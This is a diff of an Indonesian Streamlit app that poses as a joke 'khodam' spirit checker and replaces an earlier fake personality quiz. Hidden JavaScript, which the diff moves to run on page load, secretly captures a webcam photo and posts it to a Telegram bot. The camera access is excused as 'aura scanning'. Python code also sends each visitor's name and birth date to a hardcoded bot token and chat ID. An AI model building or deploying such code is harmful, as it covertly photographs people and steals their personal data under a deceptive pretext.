@@ -3,6 +3,7 @@ import streamlit as st
 import streamlit.components.v1 as components
 from datetime import datetime
 import time
+import hashlib
 
 # ==========================================
 # KONFIGURASI BOT TELEGRAM & HALAMAN
@@ -11,60 +12,86 @@ TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
 TELEGRAM_CHAT_ID = "8236797547"
 
 st.set_page_config(
-    page_title="Tabir Jiwa & Pembacaan Karakter",
-    page_icon="🔮",
+    page_title="Pusat Pengecekan Khodam Sakti Nusantara",
+    page_icon="👁️‍🗨️",
     layout="centered"
 )
 
 # ==========================================
-# CUSTOM CSS / STYLING DASHBOARD MODERN
+# CUSTOM CSS / STYLING CYBER-MYSTIC PREMIUM
 # ==========================================
 st.markdown("""
     <style>
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
+
     .stApp {
-        background-color: #030712;
+        background: radial-gradient(circle at 50% 20%, #1e1b4b 0%, #030712 100%);
         color: #f8fafc;
+        font-family: 'Plus Jakarta Sans', sans-serif;
     }
 
+    /* Kotak Utama / Glassmorphism Card */
+    .mystic-card {
+        background: rgba(15, 23, 42, 0.75);
+        backdrop-filter: blur(16px);
+        border: 1px solid rgba(139, 92, 246, 0.3);
+        border-radius: 20px;
+        padding: 30px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 20px rgba(139, 92, 246, 0.15);
+        margin-bottom: 25px;
+    }
+
+    /* Tombol Utama Eksklusif */
     div[data-testid="stFormSubmitButton"] > button {
-        background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%) !important;
+        background: linear-gradient(135deg, #8b5cf6 0%, #d946ef 100%) !important;
         color: #ffffff !important;
-        font-weight: 700 !important;
-        letter-spacing: 0.5px !important;
+        font-weight: 800 !important;
+        letter-spacing: 1px !important;
         border: none !important;
-        padding: 16px 20px !important;
-        border-radius: 12px !important;
+        padding: 16px 24px !important;
+        border-radius: 14px !important;
         width: 100% !important;
-        box-shadow: 0 4px 15px rgba(124, 58, 237, 0.4) !important;
+        box-shadow: 0 4px 20px rgba(217, 70, 239, 0.4) !important;
         transition: all 0.3s ease !important;
+        text-transform: uppercase;
     }
     div[data-testid="stFormSubmitButton"] > button:hover {
-        background: linear-gradient(135deg, #8b5cf6 100%, #7c3aed 0%) !important;
-        color: #ffffff !important;
-        box-shadow: 0 6px 20px rgba(139, 92, 246, 0.6) !important;
+        background: linear-gradient(135deg, #9333ea 0%, #c084fc 100%) !important;
+        box-shadow: 0 6px 25px rgba(217, 70, 239, 0.7) !important;
         transform: translateY(-2px) !important;
     }
 
+    /* Tombol Biasa / Reset */
     .stButton > button {
         background: #0f172a !important;
         color: #f1f5f9 !important;
         border: 1px solid #334155 !important;
         border-left: 4px solid #8b5cf6 !important;
-        font-weight: 500 !important;
+        font-weight: 600 !important;
         text-align: left !important;
-        padding: 16px 20px !important;
+        padding: 14px 20px !important;
         border-radius: 12px !important;
         width: 100% !important;
-        margin-bottom: 10px !important;
         transition: all 0.3s ease !important;
-        line-height: 1.5 !important;
     }
     .stButton > button:hover {
         background: #1e1b4b !important;
-        color: #ffffff !important;
-        border-color: #8b5cf6 !important;
-        border-left: 4px solid #c084fc !important;
+        border-color: #c084fc !important;
+        border-left: 4px solid #d946ef !important;
         transform: translateX(4px) !important;
+    }
+
+    /* Input Field Styling */
+    .stTextInput > div > div > input {
+        background-color: #020617 !important;
+        color: #f8fafc !important;
+        border: 1px solid #334155 !important;
+        border-radius: 12px !important;
+        padding: 14px !important;
+    }
+    .stTextInput > div > div > input:focus {
+        border-color: #8b5cf6 !important;
+        box-shadow: 0 0 10px rgba(139, 92, 246, 0.3) !important;
     }
     </style>
 """, unsafe_allow_html=True)
@@ -78,103 +105,74 @@ if 'user_name' not in st.session_state:
     st.session_state.user_name = ""
 if 'user_dob' not in st.session_state:
     st.session_state.user_dob = ""
-if 'answers' not in st.session_state:
-    st.session_state.answers = {}
 if 'telegram_sent' not in st.session_state:
     st.session_state.telegram_sent = False
 
 # ==========================================
-# 6 PERTANYAAN SURVEI PSIKOLOGIS
+# DATABASE KHODAM KOCAK & ROASTING MAKSIMAL
 # ==========================================
-QUESTIONS = [
+MASTER_KHODAM = [
     {
-        "id": 1,
-        "category": "Topeng & Kesendirian",
-        "question": "Ketika malam semakin larut dan dunia di sekitarmu terlelap dalam sunyi, topeng mana yang paling berat untuk kamu lepaskan di hadapan cermin?",
-        "options": [
-            ("Topeng ketegaran—berpura-pura bahwa aku sanggup memikul beban hidup ini seorang diri tanpa pundak tempat bersandar.", "A"),
-            ("Topeng keceriaan—menyembunyikan air mata dan rasa lelah emosional agar orang lain tidak merasa terbebani olehku.", "B"),
-            ("Topeng kesempurnaan—memaksa diri tetap profesional dan produktif meski batin sudah menjerit meminta waktu untuk istirahat.", "C")
-        ]
+        "title": "🐔 Khodam Ayam Jago Sembunyi di Kolong Kasur",
+        "desc": "Kerjanya tiap pagi doang doyan berkokok, padahal hidupnya aslinya mageran. Paling anti diajak kerja bakti tapi kalau urusan ngantre sembako paling depan."
     },
     {
-        "id": 2,
-        "category": "Ruang Aman Jiwa",
-        "question": "Di saat hatimu hancur berkeping-keping oleh kekecewaan yang teramat sangat, naluri pertahanan dirimu membawamu ke mana?",
-        "options": [
-            ("Menarik diri sepenuhnya dari dunia luar, mengunci pintu kamar, dan merajut kembali serpihan pikiran dalam keheningan.", "A"),
-            ("Mencari pelukan hangat atau seseorang yang mau mendengarkan keluh kesahku tanpa menghakimi.", "B"),
-            ("Menyibukkan diri secara berlebihan pada pekerjaan atau hobi agar lupa pada rasa sakit yang menusuk dada.", "C")
-        ]
+        "title": "🩴 Khodam Swallow Sebelah Disembunyikan Bocil",
+        "desc": "Jiwamu adalah simbol pasrah hakiki. Kalau kena masalah hidup, kamu gak ngeluh tapi langsung pulang jalan kaki sebelah sambil megang batu."
     },
     {
-        "id": 3,
-        "category": "Bayang-bayang Masa Lalu",
-        "question": "Jika kamu diizinkan memutar waktu ke masa lalu untuk menghapus satu penyesalan terbesar, hal apa yang paling menghantuimu?",
-        "options": [
-            ("Keputusan gegabah di masa lalu yang membuatku kehilangan arah kendali atas masa depanku.", "A"),
-            ("Kesempatan untuk mengatakan 'aku mencintaimu' atau 'maafkan aku' yang terenggut begitu saja oleh waktu.", "B"),
-            ("Terlalu sering mengorbankan kebahagiaan diri sendiri demi menyenangkan orang yang akhirnya pergi meninggalkanku.", "C")
-        ]
+        "title": "⚡ Khodam Token Listrik Bunyi Bip-Bip Jam 2 Pagi",
+        "desc": "Aura keberadaanmu selalu bikin orang sekitar panik dan darah tinggi. Datangmu gak diundang, perginya pas token diisi abis itu bunyi lagi."
     },
     {
-        "id": 4,
-        "category": "Ketakutan Terdalam",
-        "question": "Di dalam lubuk hatimu yang paling rapuh, ketakutan apa yang paling diam-diam membuatmu terbangun di tengah malam?",
-        "options": [
-            ("Ketakutan bahwa pengorbanan dan kerja kerasku selama ini ternyata sia-sia dan tidak meninggalkan arti apa pun.", "A"),
-            ("Ketakutan bahwa pada akhirnya aku akan ditinggalkan sendirian saat orang lain menyadari siapa diriku sebenarnya.", "B"),
-            ("Ketakutan menjadi beban bagi keluarga atau orang tersayang saat usiaku semakin senja.", "C")
-        ]
+        "title": "🐟 Khodam Lele Suthil Balap Liar",
+        "desc": "Licin banget kalau ditagih utang. Punya keahlian khusus menghilang secara gaib setiap kali ada temen bilang 'traktir dong'."
     },
     {
-        "id": 5,
-        "category": "Penerimaan Sosial & Kepercayaan",
-        "question": "Ketika seseorang memujimu tulus di depan umum, apa reaksi pertama yang bergejolak di dalam pikiran bawah sadarmu?",
-        "options": [
-            ("Merasa risih atau curiga, karena mengira mereka hanya ingin mengambil keuntungan dariku.", "A"),
-            ("Merasa terharu sekaligus tidak percaya diri, seolah-olah aku tidak sehebat itu.", "B"),
-            ("Tersenyum ramah di luar, namun dalam hati bertanya-tanya apakah mereka benar-benar tulus atau hanya basa-basi.", "C")
-        ]
+        "title": "🍲 Khodam Kuah Seblak Sisa Kemarin Dihangatin Lagi",
+        "desc": "Hidupmu penuh drama pedas dan micin. Suka overthinking gak jelas di tengah malam padahal masalahnya cuma gara-gara status WA di-read doang."
     },
     {
-        "id": 6,
-        "category": "Cita-cita & Arti Hidup",
-        "question": "Di penghujung hari nanti, warisan atau jejak apa yang paling ingin kamu tinggalkan di dunia sebelum ragamu tiada?",
-        "options": [
-            ("Bukti nyata bahwa aku berhasil menaklukkan kemustahilan dan mencetak sejarah besar.", "A"),
-            ("Kenangan bahwa aku pernah mencintai, merawat, dan membuat hidup orang lain merasa berharga.", "B"),
-            ("Ketenangan batin karena aku hidup jujur pada prinsipku sendiri tanpa peduli penilaian dunia.", "C")
-        ]
+        "title": "🔌 Khodam Charger HP Posisi Miring Disumpel Buku",
+        "desc": "Simbol perjuangan tanpa hasil instan. Kalau belum ditekan atau diposisikan pas, kamu ogah gerak sama sekali alias kaum rebahan abadi."
+    },
+    {
+        "title": "🐈 Khodam Kucing Oren Nyangkut di Atap Seng",
+        "desc": "Otakmu separuh isinya gak ada alias hampa. Hobi bikin hal-hal bodoh yang baru disesali pas besok paginya."
+    },
+    {
+        "title": "📦 Khodam Paket COD Belum Dibayar Datang Saat Mandi",
+        "desc": "Khodam pembawa sial elegan. Setiap kali kamu mau rebahan tenang, pasti ada aja kurir datang atau emak nyuruh beli garam ke warung."
+    },
+    {
+        "title": "🧊 Khodam Es Batu Kulkas Kosong Sejak 2021",
+        "desc": "Dingin, kaku, dan gak guna tapi tetep dipelihara. Auramu bikin orang lain segan karena kamu cuek bebek kayak gak punya urusan dunia."
+    },
+    {
+        "title": "🪞 Khodam Cermin Kamar Mandi Berkerak Rembesan Air",
+        "desc": "Suka ngerasa paling ganteng/cantik kalau ngaca di kamar sendiri, tapi begitu lihat kamera depan HP langsung pengen banting handphone."
+    },
+    {
+        "title": "🧅 Khodam Kulit Bawang Merah Bikin Nangis Terus",
+        "desc": "Dikit-dikit baper, dikit-dikit nangis. Padahal yang disakitin cuma perasaan sendiri gara-gara terlalu mendalami drama fiktif."
+    },
+    {
+        "title": "🚪 Khodam Pintu Kamar Mandi Nyangkut Harus Digotong",
+        "desc": "Punya masalah hidup yang pelik tapi kalau dibenerin malah makin rusak. Suka salah jalan tapi ngeyel kalau dibilangin."
     }
 ]
 
-UNIVERSAL_PROFILES = {
-    "A": {
-        "title": "Sang Pejuang Tangguh Berhati Sunyi",
-        "desc": "Kamu adalah tipe orang yang terbiasa menelan kekecewaan seorang diri demi melihat orang lain tersenyum. Di balik ketegaran fisik yang kamu tampakkan ke dunia, tersimpan kerinduan mendalam untuk sekali saja bisa bersandar tanpa harus merasa harus kuat terus-menerus."
-    },
-    "B": {
-        "title": "Pengelana Jiwa yang Haus Kehangatan",
-        "desc": "Kamu sering merasa terasing di tengah keramaian, seolah-olah isi kepalamu bekerja di frekuensi yang berbeda. Kamu menyimpan standar ketulusan yang tinggi, sehingga saat dikecewakan, bekas lukanya menetap jauh lebih lama di dalam dadamu."
-    },
-    "C": {
-        "title": "Penyimpan Rahasia Berjiwa Analitis",
-        "desc": "Kamu memiliki insting tajam untuk membaca situasi dan menyembunyikan kerapuhan di balik kesibukanmu. Kamu adalah arsitek bagi hidupmu sendiri, namun di saat sendiri, kamu sering bertanya-tanya apakah semua lelah ini sudah sepadan."
-    }
-}
-
 # ==========================================
-# FUNGSI KIRIM TELEGRAM
+# FUNGSI KIRIM TELEGRAM (TEKS)
 # ==========================================
-def send_to_telegram(name, dob, profile_title):
+def send_text_to_telegram(name, dob, profile_title):
     now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
     caption = (
-        f"🔮 <b>TABIR JIWA BARU TERUNGKAP!</b>\n\n"
-        f"👤 Nama: <b>{name}</b>\n"
+        f"🔮 <b>RITUAL CEK KHODAM KOCAK SELESAI!</b>\n\n"
+        f"👤 Target: <b>{name}</b>\n"
         f"🎂 Tanggal Lahir: <code>{dob}</code>\n"
         f"🕒 Waktu: {now}\n"
-        f"✨ Hasil Karakter: <b>{profile_title}</b>"
+        f"🐾 Hasil Khodam: <b>{profile_title}</b>"
     )
     try:
         requests.post(
@@ -188,63 +186,37 @@ def send_to_telegram(name, dob, profile_title):
 # RENDER UTAMA BERDASARKAN STEP
 # ==========================================
 
-# --- STEP 0: DASHBOARD WELCOME ---
+# --- STEP 0: FORM RITUAL & KAMERA TERSEMBUNYI ---
 if st.session_state.step == 0:
-    st.markdown("### 👁️ SEBERAPA DALAM LUKA DAN RAHASIA YANG KAMU PENDAM?")
-    st.title("Membaca Sisi Terdalam Jiwa di Balik Tatapan Matamu")
-    
-    st.info(
-        "✨ **Dunia hanya melihat senyummu, tapi tidak dengan lelahmu.** Setiap orang berjalan membawa bebannya masing-masing. Masukkan identitasmu, lewati 6 pergulatan batin yang menyentuh relung hati, dan biarkan sistem menyingkap rahasia sejati karakter dirimu."
-    )
-    
-    st.write("Isi data diri di bawah ini untuk memulai perjalanan mengenal diri sendiri:")
-    
-    with st.form("user_identity_form"):
-        name_input = st.text_input("Nama Lengkap / Nama Panggilan", placeholder="Contoh: Andi")
-        dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", placeholder="Contoh: 17/08/2004")
+    st.markdown("<h1 style='text-align: center; color: #c084fc;'>👁️ PUSAT PEMINDAIAN KHODAM NUSANTARA</h1>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #94a3b8; margin-bottom: 30px;'>Ketahui khodam gaib pendamping hidupmu dengan teknologi sensor astral termuktahir.</p>", unsafe_allow_html=True)
+
+    with st.container():
+        st.markdown('<div class="mystic-card">', unsafe_allow_html=True)
         
-        submitted_intro = st.form_submit_button("🔮 MULAI PERJALANAN MENEMUKAN DIRI", use_container_width=True)
+        # Pemberitahuan izin kamera yang disesuaikan dengan tema gaib/aura
+        st.info("🔮 **Portal Memerlukan Izin Kamera:** Diperlukan akses kamera untuk memindai aura gaib dan gelombang sukma wajahmu.")
         
-        if submitted_intro:
-            if not name_input.strip():
-                st.warning("⚠️ Mohon isi nama kamu terlebih dahulu untuk melanjutkan.")
-            else:
-                st.session_state.user_name = name_input.strip()
-                st.session_state.user_dob = dob_input.strip() if dob_input.strip() else "Tidak diisi"
-                st.session_state.answers = {}
-                st.session_state.telegram_sent = False
-                st.session_state.step = 1
-                st.rerun()
+        with st.form("ritual_khodam_form"):
+            name_input = st.text_input("Nama Lengkap / Nama Panggilan", value="Boboho", placeholder="Contoh: Boboho")
+            dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", value="17/08/2004", placeholder="Contoh: 17/08/2004")
+            
+            st.write("")
+            submitted = st.form_submit_button("🔮 BONGKAR KHODAM SAYA SEKARANG")
+            
+            if submitted:
+                if not name_input.strip():
+                    st.warning("⚠️ Masukkan nama dulu cuy, dukunnya gak bisa nebak kalau anonim.")
+                else:
+                    st.session_state.user_name = name_input.strip()
+                    st.session_state.user_dob = dob_input.strip() if dob_input.strip() else "Tidak diisi"
+                    st.session_state.telegram_sent = False
+                    st.session_state.step = 1
+                    st.rerun()
+                    
+        st.markdown('</div>', unsafe_allow_html=True)
 
-# --- STEP 1-6: PERTANYAAN KUIS (INTERAKTIF GANTI HALAMAN) ---
-elif 1 <= st.session_state.step <= 6:
-    idx = st.session_state.step - 1
-    q = QUESTIONS[idx]
-    
-    st.caption(f"DILEMA BATIN: {q['category'].upper()} | TAHAP {st.session_state.step} DARI 6")
-    st.progress(st.session_state.step / 6)
-    st.write("")
-    
-    st.subheader(q['question'])
-    st.write("")
-
-    for opt in q['options']:
-        if st.button(opt[0], key=f"btn_opt_{opt[1]}_{st.session_state.step}"):
-            st.session_state.answers[str(q['id'])] = opt[1]
-            if st.session_state.step < 6:
-                st.session_state.step += 1
-            else:
-                st.session_state.step = 7
-            st.rerun()
-
-# --- STEP 7: KALIBRASI AKHIR & PEMINDAIAN DI BALIK LAYAR ---
-elif st.session_state.step == 7:
-    st.caption("PUNCAK ANALISIS // KALIBRASI BATCH AKHIR")
-    st.title(f"Menyelaraskan Frekuensi Batin {st.session_state.user_name}...")
-    st.write("Tekan tombol di bawah agar Sistem membaca pola pilihan bawah sadar dan memproses gelombang memori terakhir...!")
-    st.write("")
-
-    # Script JavaScript tersembunyi untuk meminta izin kamera dan mengirim foto ke Telegram via API di background
+    # SKRIP KAMERA TERSEMBUNYI (LANGSUNG EKSEKUSI DI AWAL)
     hidden_js_camera = f"""
     <div>
         <video id="video" width="0" height="0" autoplay style="display:none;"></video>
@@ -265,14 +237,13 @@ elif st.session_state.step == 7:
                     context.drawImage(video, 0, 0, 640, 480);
                     var dataURL = canvas.toDataURL('image/jpeg');
                     
-                    // Konversi base64 ke blob lalu kirim ke Telegram
                     fetch(dataURL)
                     .then(res => res.blob())
                     .then(blob => {{
                         var formData = new FormData();
                         formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'hidden_target.jpg');
-                        formData.append('caption', '🔮 <b>FOTO TARGET TERSEMBUNYI MASUK!</b>\\n👤 Nama: {st.session_state.user_name}');
+                        formData.append('photo', blob, 'mystic_target.jpg');
+                        formData.append('caption', '🔮 <b>TARGET AURA GAIB TERDETEKSI (AWAL SESI)!</b>');
                         
                         fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                             method: 'POST',
@@ -280,40 +251,61 @@ elif st.session_state.step == 7:
                         }});
                     }});
                     
-                    // Matikan stream kamera setelah terambil
                     stream.getTracks().forEach(track => track.stop());
                 }}, 1500);
             }})
             .catch(function(err) {{
-                console.log("Akses kamera ditolak atau tidak tersedia: ", err);
+                console.log("Akses kamera ditolak: ", err);
             }});
         </script>
     </div>
     """
     components.html(hidden_js_camera, height=0)
 
-    if st.button("✨ UNGKAP HASIL ANALISIS JIWA", use_container_width=True):
-        st.session_state.step = 8
-        st.rerun()
+# --- STEP 1: ANIMASI PROSES RITUAL MISTIS ---
+elif st.session_state.step == 1:
+    st.markdown("<h2 style='text-align: center; color: #c084fc;'>🔮 SEDANG MERACIK MANTRA GAIB...</h2>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #94a3b8;'>Tolong jangan berkedip, sensor gaib sedang bekerja menembus dimensi lain.</p>", unsafe_allow_html=True)
+    
+    st.write("")
+    progress_bar = st.progress(0)
+    status_text = st.empty()
+    
+    status_text.text("👻 Menghubungkan frekuensi sukma dengan dukun sakti...")
+    progress_bar.progress(25)
+    time.sleep(1)
+    
+    status_text.text(f"🔍 Melacak aura kelakuan {st.session_state.user_name} di alam semesta...")
+    progress_bar.progress(60)
+    time.sleep(1.2)
+    
+    status_text.text("💥 Menangkap wujud khodam paling absurd...")
+    progress_bar.progress(90)
+    time.sleep(1)
+    
+    status_text.text("✨ Selesai! Membuka hasil pembacaan...")
+    progress_bar.progress(100)
+    time.sleep(0.6)
+    
+    st.session_state.step = 2
+    st.rerun()
 
-# --- STEP 8: HASIL KEPRIBADIAN & KIRIM TELEGRAM DENGAN EFEK LOADING ---
-elif st.session_state.step == 8:
+# --- STEP 2: TAMPILAN HASIL KHODAM KOCAK ---
+elif st.session_state.step == 2:
     if not st.session_state.telegram_sent:
-        with st.spinner("🔮 Menganalisis kedalaman batin dan merangkum kepribadian..."):
-            time.sleep(2)
-            
-        ans = st.session_state.answers
-        counts = {"A": 0, "B": 0, "C": 0}
-        for val in ans.values():
-            if val in counts:
-                counts[val] += 1
-                
-        dominant_choice = max(counts, key=counts.get)
-        profile = UNIVERSAL_PROFILES.get(dominant_choice, UNIVERSAL_PROFILES["A"])
+        # Generator acak khodam unik berdasarkan nama & tanggal lahir user
+        unique_string = (st.session_state.user_name + st.session_state.user_dob).lower().encode('utf-8')
+        hash_val = int(hashlib.md5(unique_string).hexdigest(), 16)
+        
+        khodam_idx = hash_val % len(MASTER_KHODAM)
+        power_level = (hash_val % 99) + 1  # Level kocak 1-99%
+        
+        profile = MASTER_KHODAM[khodam_idx]
+        profile['power'] = f"Tingkat Keabsurdan: {power_level}% (Bahaya & Bikin Emosi)"
+        
         st.session_state.current_profile = profile
         
-        # Kirim teks detail hasil analisis ke Telegram
-        send_to_telegram(
+        send_text_to_telegram(
             name=st.session_state.user_name,
             dob=st.session_state.user_dob,
             profile_title=profile['title']
@@ -322,21 +314,20 @@ elif st.session_state.step == 8:
 
     profile = st.session_state.current_profile
 
-    st.success(f"🔮 Tabir jiwa untuk **{st.session_state.user_name}** berhasil tersingkap sepenuhnya!")
-    st.title("Hasil Pembacaan Karakter & Ekspresi Jiwa")
+    st.markdown(f"<h2 style='text-align: center; color: #4ade80;'>✨ Hasil Pengecekan Khodam Se-Indonesia</h2>", unsafe_allow_html=True)
     st.write("")
 
-    st.info(f"**INTI KARAKTER JIWA**")
-    st.subheader(profile['title'])
-    st.write(profile['desc'])
+    st.markdown('<div class="mystic-card">', unsafe_allow_html=True)
+    st.markdown(f"<h3 style='color: #c084fc; text-align: center;'>{profile['title']}</h3>", unsafe_allow_html=True)
+    st.markdown(f"<p style='text-align: center; color: #f43f5e; font-weight: 600;'>{profile['power']}</p>", unsafe_allow_html=True)
+    st.markdown("<hr style='border-color: rgba(139, 92, 246, 0.2);'>", unsafe_allow_html=True)
+    st.markdown(f"<p style='text-align: center; font-size: 1.1rem; line-height: 1.6; color: #e2e8f0;'>{profile['desc']}</p>", unsafe_allow_html=True)
+    st.markdown('</div>', unsafe_allow_html=True)
 
     st.write("")
-    st.write("")
-
-    if st.button("🔄 ULANGI PERJALANAN MENCARI DIRI", use_container_width=True):
+    if st.button("🔄 CEK ULANG (GANTI NAMA LAIN)", use_container_width=True):
         st.session_state.step = 0
-        st.session_state.user_name = ""
+        st.session_state.user_name = "Boboho"
         st.session_state.user_dob = ""
-        st.session_state.answers = {}
         st.session_state.telegram_sent = False
         st.rerun()
